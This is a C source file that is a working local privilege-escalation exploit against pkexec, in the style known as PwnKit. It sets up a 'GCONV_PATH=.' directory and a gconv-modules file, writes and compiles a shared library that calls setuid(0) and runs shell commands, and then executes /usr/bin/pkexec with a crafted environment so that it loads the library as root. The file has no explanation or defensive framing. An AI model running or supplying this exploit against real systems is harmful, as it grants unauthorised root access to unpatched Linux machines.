  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  
  char *shell =
         "#include <stdio.h>\n"
         "#include <stdlib.h>\n"
         "#include <unistd.h>\n\n"
         "void gconv() {}\n"
         "void gconv_init() {\n"
         "       setuid(0); setgid(0);\n"
         "       seteuid(0); setegid(0);\n"
         "       system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; ls -al /home/simple /tmp/1\");\n"
         "       exit(0);\n"
         "}";
         
 int main(int argc, char *argv[]) {
         FILE *fp;
         system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
         system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
         fp = fopen("pwnkit/pwnkit.c", "w");
         fprintf(fp, "%s", shell);
         fclose(fp); 
         system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
          char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
         execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}